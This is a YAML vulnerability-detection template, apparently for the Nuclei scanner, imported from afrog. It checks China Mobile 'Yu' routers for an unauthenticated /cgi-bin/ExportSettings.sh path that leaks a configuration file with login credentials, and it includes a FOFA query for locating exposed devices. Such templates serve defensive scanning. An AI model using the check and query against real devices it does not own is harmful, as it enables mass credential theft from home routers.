# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - The following line
          - Login
          - Password
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/cgi-bin/ExportSettings.sh'
id: china-mobile-exportsettings-info-leak
info:
  author: jijue
  description: |-
    中国移动 禹路由 ExportSettings.sh 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息
    fofa: title="互联世界 物联未来-登录"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞
  severity: high
  tags: mobile,exportsettings,info-leak,argus-import
